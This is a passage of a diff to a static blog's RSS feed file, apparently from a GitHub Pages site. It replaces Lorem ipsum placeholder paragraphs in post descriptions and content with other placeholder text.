             <description>Intro Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.
-Title 1 Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula.</description>
+Title 1 Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie.</description>
             <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
 
 
@@ -33893,11 +34843,11 @@ Title 1 Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libe
 
 
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
 
-  <p><em>Nam quam ante, faucibus id dolor eget, scelerisque congue justo. Sed sit amet cursus metus, sed convallis mauris. Vestibulum lobortis volutpat libero maximus faucibus. Vivamus eleifend placerat ipsum, nec tempor tellus placerat sit amet. Proin ac velit at nulla ultrices tempor non ac sem. Morbi volutpat justo non augue imperdiet lacinia. Sed dui ipsum, viverra quis tincidunt vitae, sodales nec est. Maecenas ac nibh consequat, venenatis purus ullamcorper, porttitor mauris. Nulla elementum sem eget tortor fermentum malesuada. Integer pretium felis sem, in tincidunt nibh elementum sit amet. Donec nec orci iaculis, interdum est non, sodales est. Suspendisse pulvinar, ante sed elementum feugiat, mauris turpis blandit eros, egestas pretium risus nisl mattis urna. Integer sed urna turpis. Quisque auctor ac elit id imperdiet. Vivamus sed tortor semper, tempus ipsum sed, auctor nibh. Fusce sit amet facilisis tellus.</em></p>
+  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>
 
 
 
@@ -33908,11 +34858,11 @@ Title 1 Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libe
 
 
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
-
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Maecenas enim elit, iaculis ac consectetur sit amet, faucibus nec enim. Aenean eu accumsan odio. Nullam tristique risus eros, imperdiet sodales elit feugiat sed. Phasellus id convallis dui, convallis malesuada urna. Mauris et leo ante. Donec scelerisque magna eleifend urna ullamcorper rhoncus. Nunc ac porta nibh. Sed in sagittis nisl. Quisque facilisis consectetur nunc quis ullamcorper. In a lorem condimentum, pellentesque metus id, posuere nisi. Donec tempor ex ornare diam rhoncus, eget sodales ante tempor. Etiam neque metus, pulvinar et fringilla sit amet, facilisis a lacus. Fusce a tincidunt ligula, sed tempor nunc.</em></p>
 
   <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
+
+  <p><em>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor. Sed id tortor et neque viverra faucibus. Phasellus sem felis, tincidunt gravida vestibulum eu, lobortis eget nulla. Cras pharetra neque vitae ullamcorper eleifend. Etiam sagittis rhoncus dapibus. Donec ultrices odio at lectus egestas mollis. Cras lacus est, ultrices eget gravida eu, porttitor vel risus. Fusce eu erat in risus congue elementum quis non ante. Ut in interdum felis.</em></p>
 
 
 
@@ -33923,7 +34873,7 @@ Title 1 Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libe
 
 
 
-  <p><em>Suspendisse dignissim dignissim enim non imperdiet. Cras tristique, enim non rutrum tempor, purus leo imperdiet lorem, imperdiet sollicitudin diam nunc a purus. Aliquam posuere risus vitae quam luctus aliquet. Nullam pretium nunc velit, at aliquam tellus finibus in. Pellentesque consectetur elit sed sapien iaculis fermentum. Vestibulum at dolor eu nunc gravida dignissim non eget nibh. Donec neque lorem, fringilla ut enim quis, faucibus tincidunt nunc.</em></p>
+  <p><em>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor. Sed id tortor et neque viverra faucibus. Phasellus sem felis, tincidunt gravida vestibulum eu, lobortis eget nulla. Cras pharetra neque vitae ullamcorper eleifend. Etiam sagittis rhoncus dapibus. Donec ultrices odio at lectus egestas mollis. Cras lacus est, ultrices eget gravida eu, porttitor vel risus. Fusce eu erat in risus congue elementum quis non ante. Ut in interdum felis.</em></p>
 
 
 
@@ -33936,19 +34886,19 @@ Title 1 Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libe
             <pubDate>Mon, 25 Jan 2021 00:04:16 +0800</pubDate>
             
             <guid>https://0xade1.github.io/devdraft/posts/2021/01/my-first-post/</guid>
-            <description>//: &amp;lt;&amp;gt; Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.
-Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula.</description>
+            <description>//: &amp;lt;&amp;gt; Suspendisse dignissim dignissim enim non imperdiet. Cras tristique, enim non rutrum tempor, purus leo imperdiet lorem, imperdiet sollicitudin diam nunc a purus. Aliquam posuere risus vitae quam luctus aliquet. Nullam pretium nunc velit, at aliquam tellus finibus in. Pellentesque consectetur elit sed sapien iaculis fermentum. Vestibulum at dolor eu nunc gravida dignissim non eget nibh. Donec neque lorem, fringilla ut enim quis, faucibus tincidunt nunc.
+Nullam id lorem vel quam porttitor pretium eu ac velit.</description>
             <content type="html"><![CDATA[<p><a href="" title="ceci est un commentaire">//</a>: &lt;&gt; 
 
 
 
 
 
-  <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
+  <p><em>Suspendisse dignissim dignissim enim non imperdiet. Cras tristique, enim non rutrum tempor, purus leo imperdiet lorem, imperdiet sollicitudin diam nunc a purus. Aliquam posuere risus vitae quam luctus aliquet. Nullam pretium nunc velit, at aliquam tellus finibus in. Pellentesque consectetur elit sed sapien iaculis fermentum. Vestibulum at dolor eu nunc gravida dignissim non eget nibh. Donec neque lorem, fringilla ut enim quis, faucibus tincidunt nunc.</em></p>
 
   <p><em>Nullam id lorem vel quam porttitor pretium eu ac velit. Etiam felis libero, tristique id laoreet ut, vehicula eu ligula. Proin facilisis dignissim sollicitudin. Maecenas eget urna scelerisque, laoreet velit at, placerat dolor. Fusce fermentum commodo mollis. Nam a ultricies sapien. Pellentesque tempus odio sit amet tortor tincidunt, at tristique purus tincidunt.</em></p>
 
-  <p><em>Sed consectetur enim non erat mattis pretium. Morbi faucibus tellus ac ipsum molestie, ac sagittis ligula molestie. Mauris sed placerat elit. Ut eleifend dolor odio. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed dapibus porttitor tortor eu venenatis. Donec lacus mi, rhoncus nec iaculis condimentum, maximus nec ipsum. Aliquam eu nisl commodo, varius ligula eu, faucibus dui.</em></p>
+  <p><em>Curabitur laoreet nec libero at condimentum. Sed ultrices dui eget sapien facilisis sagittis. Donec rhoncus auctor ligula ut dapibus. Curabitur ut dapibus eros, non euismod arcu. Donec dictum auctor sem, ut accumsan magna fringilla ut. Phasellus sit amet tincidunt leo. Cras maximus, dolor nec tincidunt maximus, massa eros fringilla sapien, et commodo eros tellus at leo. Cras elementum tempor commodo. Sed in arcu eu metus placerat volutpat vitae eu arcu. Etiam aliquam sem eget velit pulvinar dictum. Vestibulum volutpat ligula quis lorem commodo, vel tincidunt ligula dictum. Vestibulum ac consequat tellus. Fusce ac nisi et metus finibus vestibulum quis in sem.</em></p>
 
 
 </p>
